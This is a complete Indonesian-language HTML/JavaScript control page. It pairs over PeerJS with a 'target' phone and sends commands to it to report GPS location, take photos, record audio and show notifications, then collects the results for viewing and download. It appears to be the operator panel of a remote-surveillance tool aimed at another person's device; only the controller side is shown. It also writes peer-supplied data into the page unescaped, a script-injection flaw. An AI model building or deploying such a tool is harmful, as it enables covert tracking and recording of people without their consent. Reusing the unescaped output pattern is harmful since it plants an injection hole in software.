<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CONTROLLER - Pengendali</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0277bd, #4fc3f7);
      font-family: system-ui, sans-serif;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background: white;
      border-radius: 40px;
      padding: 24px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
    }
    h1 { color: #0277bd; font-size: 1.6rem; margin-bottom: 5px; }
    .sub { color: #666; font-size: 0.8rem; margin-bottom: 20px; }
    
    .pairing-section {
      background: #e1f5fe;
      border-radius: 28px;
      padding: 16px;
      margin-bottom: 20px;
    }
    .pair-input {
      display: flex;
      gap: 12px;
      margin-top: 12px;
      flex-wrap: wrap;
    }
    .pair-input input {
      flex: 1;
      padding: 14px 18px;
      border-radius: 48px;
      border: 1px solid #4fc3f7;
      font-size: 1rem;
    }
    .pair-input button {
      background: #0288d1;
      border: none;
      padding: 14px 24px;
      border-radius: 48px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .status-connection {
      background: #0d47a1;
      color: white;
      padding: 12px;
      border-radius: 40px;
      text-align: center;
      margin-bottom: 20px;
      font-weight: bold;
    }
    .connected { background: #2e7d32; }
    
    .buttons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
      gap: 12px;
      margin: 20px 0;
    }
    .ctrl-btn {
      background: white;
      border: 2px solid #4fc3f7;
      border-radius: 40px;
      padding: 14px 6px;
      font-weight: bold;
      color: #0277bd;
      cursor: pointer;
    }
    .ctrl-btn:active { transform: scale(0.96); background: #e1f5fe; }
    .ctrl-btn:disabled { opacity: 0.4; transform: none; }
    
    .result-area {
      background: #f5f5f5;
      border-radius: 24px;
      padding: 16px;
      margin-top: 16px;
      max-height: 350px;
      overflow-y: auto;
    }
    .result-title {
      font-weight: bold;
      color: #0277bd;
      margin-bottom: 10px;
    }
    .result-item {
      background: white;
      padding: 10px;
      border-radius: 16px;
      margin-bottom: 8px;
      font-size: 0.8rem;
      word-break: break-word;
    }
    img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; }
    audio { width: 100%; margin-top: 8px; }
  </style>
</head>
<body>
<div class="container">
  <h1>🎮 CONTROLLER</h1>
  <div class="sub">Hubungkan ke HP Target untuk mengontrol</div>
  
  <div class="pairing-section">
    <div style="font-weight:bold;">🔗 Masukkan Kode Pairing Target</div>
    <div class="pair-input">
      <input type="text" id="peerIdInput" placeholder="Contoh: 3a4b5c6d-7e8f...">
      <button id="connectBtn">Hubungkan</button>
    </div>
  </div>
  
  <div class="status-connection" id="connectionStatus">
    ⚪ Belum terhubung
  </div>
  
  <div class="buttons-grid">
    <button class="ctrl-btn" id="btnLokasi" disabled>📍 Ambil Lokasi</button>
    <button class="ctrl-btn" id="btnNotif" disabled>🔔 Kirim Notifikasi</button>
    <button class="ctrl-btn" id="btnFoto" disabled>📷 Ambil Foto</button>
    <button class="ctrl-btn" id="btnRekam" disabled>🎙️ Mulai Rekam</button>
    <button class="ctrl-btn" id="btnStopRekam" disabled>⏹️ Stop & Kirim</button>
  </div>
  
  <div class="result-area">
    <div class="result-title">📡 Hasil dari HP Target</div>
    <div id="resultList">
      <div class="result-item">Belum ada hasil, hubungkan dulu ke target</div>
    </div>
  </div>
</div>

<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
<script>
  let peer = null;
  let connection = null;
  let isConnected = false;
  
  const resultList = document.getElementById('resultList');
  const connectionStatus = document.getElementById('connectionStatus');
  const peerIdInput = document.getElementById('peerIdInput');
  const connectBtn = document.getElementById('connectBtn');
  
  const btns = {
    lokasi: document.getElementById('btnLokasi'),
    notif: document.getElementById('btnNotif'),
    foto: document.getElementById('btnFoto'),
    rekam: document.getElementById('btnRekam'),
    stopRekam: document.getElementById('btnStopRekam')
  };
  
  function enableButtons(enabled) {
    Object.values(btns).forEach(btn => btn.disabled = !enabled);
  }
  
  function addResult(type, data, isError = false) {
    const div = document.createElement('div');
    div.className = 'result-item';
    div.style.borderLeft = isError ? '4px solid #f44336' : '4px solid #4caf50';
    
    let content = `<strong>📌 ${type.toUpperCase()}</strong><br>`;
    
    if (isError) {
      content += `⚠️ Error: ${data.error || data}`;
    } else {
      switch(type) {
        case 'location':
          content += `📍 Latitude: ${data.lat}<br>📍 Longitude: ${data.lng}<br>🎯 Akurasi: ±${Math.round(data.accuracy)} meter`;
          break;
        case 'notification':
          content += `🔔 Notifikasi: "${data.message}"`;
          break;
        case 'photo':
          content += `📸 Foto berhasil diambil:<br><img src="${data.image}" class="result-img" onclick="window.open(this.src)">`;
          break;
        case 'audio':
          content += `🎵 Rekaman suara:<br><audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
          break;
        case 'recording_started':
          content += `🎙️ Rekaman dimulai di target... tunggu hingga selesai (max 15 detik)`;
          break;
        default:
          content += JSON.stringify(data);
      }
    }
    
    div.innerHTML = content;
    resultList.prepend(div);
    if (resultList.children.length > 15) {
      resultList.removeChild(resultList.lastChild);
    }
  }
  
  function updateConnectionStatus(text, isConn = false) {
    isConnected = isConn;
    connectionStatus.innerHTML = isConn ? `✅ ${text}` : `⚠️ ${text}`;
    connectionStatus.className = isConn ? 'status-connection connected' : 'status-connection';
    enableButtons(isConn);
  }
  
  function sendCommand(type, extra = {}) {
    if (!connection || !connection.open) {
      addResult('error', { error: 'Tidak terhubung ke target' }, true);
      return;
    }
    connection.send({ type, ...extra });
    addResult('command', `📤 Mengirim perintah: ${type}`);
  }
  
  function connectToPeer(peerId) {
    if (connection) {
      connection.close();
    }
    
    updateConnectionStatus('Menghubungkan...', false);
    connection = peer.connect(peerId);
    
    connection.on('open', () => {
      updateConnectionStatus(`Terhubung ke ${peerId.substring(0, 15)}...`, true);
      addResult('connection', `✅ Berhasil terhubung ke target`);
    });
    
    connection.on('data', (data) => {
      if (data.response) {
        addResult(data.type, data.data, data.data?.error);
      } else {
        addResult('info', data);
      }
    });
    
    connection.on('close', () => {
      updateConnectionStatus('Koneksi terputus', false);
      addResult('connection', '❌ Koneksi ke target terputus', true);
      connection = null;
    });
    
    connection.on('error', (err) => {
      updateConnectionStatus('Error koneksi', false);
      addResult('error', { error: err.toString() }, true);
    });
  }
  
  function initPeer() {
    peer = new Peer();
    
    peer.on('open', (id) => {
      console.log('Controller ID:', id);
    });
    
    peer.on('error', (err) => {
      console.error('Peer error:', err);
      if (err.type === 'unavailable-id') {
        addResult('error', 'ID peer tidak valid', true);
      }
    });
  }
  
  // Event tombol
  btns.lokasi.onclick = () => sendCommand('location');
  btns.notif.onclick = () => {
    const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller!');
    if (msg) sendCommand('notification', { message: msg });
  };
  btns.foto.onclick = () => sendCommand('take_photo');
  btns.rekam.onclick = () => sendCommand('start_record');
  btns.stopRekam.onclick = () => sendCommand('stop_record');
  
  connectBtn.onclick = () => {
    const peerId = peerIdInput.value.trim();
    if (!peerId) {
      addResult('error', { error: 'Masukkan kode pairing target' }, true);
      return;
    }
    connectToPeer(peerId);
  };
  
  // Minta izin notifikasi di controller
  if ('Notification' in window) Notification.requestPermission();
  
  initPeer();
</script>
</body>
</html>
